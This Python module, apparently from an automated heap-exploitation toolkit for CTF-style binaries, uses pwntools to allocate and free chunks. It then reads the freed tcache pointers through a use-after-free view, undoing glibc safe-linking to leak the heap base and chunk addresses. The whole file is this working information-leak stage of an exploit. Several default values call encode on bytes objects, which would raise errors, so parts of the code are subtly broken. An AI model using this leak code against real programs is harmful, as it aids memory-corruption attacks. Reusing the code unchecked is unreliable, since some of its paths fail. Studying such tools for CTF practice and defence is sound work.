"""
Chunk Size Prober — discovers real heap layout by interacting with the binary.

Allocs 3+ chunks, frees them, reads tcache fd values, and computes:
- chunk_size: distance between consecutive heap chunks
- heap_base: base address of the heap region
- c0_addr: address of the first allocated chunk
- c1_addr: address of the second allocated chunk (c0 + chunk_size)
"""

import struct
import time
from typing import Dict, List, Optional, Tuple

CHUNK_SIZES_TO_TRY = [0x20, 0x30, 0x40, 0x50, 0x60, 0x70, 0x80, 0x90, 0xa0, 0x100, 0x200]


class ChunkProber:
    """Probes binary heap to discover actual chunk size and layout."""

    def __init__(self, binary_path: str, interface_map: dict,
                 libc_path: Optional[str] = None, ld_path: Optional[str] = None,
                 timeout: int = 10):
        self.binary_path = binary_path
        self.interface_map = interface_map
        self.libc_path = libc_path
        self.ld_path = ld_path
        self.timeout = timeout

    def probe(self) -> Optional[dict]:
        """Probe the binary and return heap layout info."""
        try:
            from pwn import ELF, process, u64, context
            context.log_level = 'info'
            context.arch = 'amd64'

            p = self._spawn()
            if p is None:
                return None

            ops = self._build_op_map()

            # Alloc 3 chunks
            self._alloc(p, ops, 0, b'A' * 8)
            self._alloc(p, ops, 1, b'B' * 8)
            self._alloc(p, ops, 2, b'C' * 8)

            # Free all 3: c0, c1, c2 → tcache now has c2→c1→c0
            self._free(p, ops, 0)
            self._free(p, ops, 1)
            self._free(p, ops, 2)

            # View c0, c1, c2 → get XOR'd fd values
            fd0 = self._view(p, ops, 0)
            fd1 = self._view(p, ops, 1)
            fd2 = self._view(p, ops, 2)

            if fd0 is None or fd1 is None or fd2 is None:
                p.close()
                return None

            # c0_addr: first chunk at heap_base + 0x290 (tcache struct = 0x290 for glibc 2.34+)
            heap_base_aligned = fd0 << 12

            # Try each possible tcache struct size and chunk_size
            for tcache_sz in [0x290, 0x250]:  # 2.34+ and 2.26
                c0_addr = heap_base_aligned + tcache_sz
                c0_shift = c0_addr >> 12

                # Verify: fd0 should equal c0_shift (since c0's next = NULL)
                if c0_shift != fd0:
                    continue

                # Now verify with c1: c1_addr = c0_addr + chunk_size
                for cs in CHUNK_SIZES_TO_TRY:
                    c1_addr = c0_addr + cs
                    c1_shift = c1_addr >> 12
                    expected_fd1 = c0_addr ^ c1_shift
                    if expected_fd1 != fd1:
                        continue

                    # Verify with c2: c2_addr = c1_addr + cs
                    c2_addr = c1_addr + cs
                    c2_shift = c2_addr >> 12
                    expected_fd2 = c1_addr ^ c2_shift
                    if expected_fd2 != fd2:
                        continue

                    # All three match! We found the right configuration.
                    result = {
                        "chunk_size": cs,
                        "heap_base": heap_base_aligned,
                        "tcache_struct_size": tcache_sz,
                        "c0_addr": c0_addr,
                        "c1_addr": c1_addr,
                        "c2_addr": c2_addr,
                    }
                    p.close()
                    return result

            p.close()
            return None

        except Exception as e:
            import traceback
            traceback.print_exc()
            return None

    def _spawn(self):
        try:
            from pwn import process
            # Try without LD patching first (faster, works with system libc)
            return process(self.binary_path)
        except Exception:
            try:
                if self.ld_path and self.libc_path:
                    import os
                    libc_dir = os.path.dirname(os.path.abspath(self.libc_path))
                    return process([os.path.abspath(self.ld_path),
                                    '--library-path', libc_dir,
                                    os.path.abspath(self.binary_path)])
            except Exception:
                pass
        return None

    def _build_op_map(self) -> dict:
        op_map = {}
        for ch, info in self.interface_map.get("operations", {}).items():
            role = info.get("role")
            if role:
                op_map[role] = ch
        return op_map

    def _alloc(self, p, op_map: dict, idx: int, data: bytes):
        menu = self.interface_map.get("menu_prompt", b"> ").encode()
        # Remove b'' wrapper if present
        if isinstance(menu, bytes):
            menu = menu
        elif isinstance(menu, str):
            menu = menu.encode()

        ch = op_map.get("alloc", "1")
        op_info = self.interface_map["operations"][ch]
        steps = op_info.get("steps", [])

        p.sendlineafter(menu, ch.encode())
        for step in steps:
            prompt = step.get("prompt", b": ").encode()
            if isinstance(prompt, str):
                prompt = prompt.encode()
            if step.get("arg") == "idx":
                p.sendlineafter(prompt, str(idx).encode())
            elif step.get("arg") == "size":
                p.sendlineafter(prompt, str(8).encode())
            elif step.get("arg") == "data":
                p.sendafter(prompt, data)
        time.sleep(0.05)

    def _free(self, p, op_map: dict, idx: int):
        ch = op_map.get("free", "2")
        op_info = self.interface_map.get("operations", {}).get(ch, {})
        steps = op_info.get("steps", [])
        menu = self.interface_map.get("menu_prompt", b"> ").encode()
        if isinstance(menu, str):
            menu = menu.encode()

        p.sendlineafter(menu, ch.encode())
        for step in steps:
            prompt = step.get("prompt", b": ").encode()
            if isinstance(prompt, str):
                prompt = prompt.encode()
            if step.get("arg") == "idx":
                p.sendlineafter(prompt, str(idx).encode())
        time.sleep(0.05)

    def _view(self, p, op_map: dict, idx: int) -> Optional[int]:
        ch = op_map.get("view", "3")
        op_info = self.interface_map.get("operations", {}).get(ch, {})
        steps = op_info.get("steps", [])
        menu = self.interface_map.get("menu_prompt", b"> ").encode()
        if isinstance(menu, str):
            menu = menu.encode()

        p.sendlineafter(menu, ch.encode())
        for step in steps:
            prompt = step.get("prompt", b": ").encode()
            if isinstance(prompt, str):
                prompt = prompt.encode()
            if step.get("arg") == "idx":
                p.sendlineafter(prompt, str(idx).encode())

        try:
            # Read until next menu or timeout
            raw = p.recvuntil(b'Menu', drop=True, timeout=2)
            if raw and len(raw) >= 5:
                return struct.unpack('<Q', raw[:8].ljust(8, b'\x00'))[0]
        except Exception:
            try:
                raw = p.recv(timeout=1)
                if raw and len(raw) >= 5:
                    return struct.unpack('<Q', raw[:8].ljust(8, b'\x00'))[0]
            except Exception:
                pass
        return None
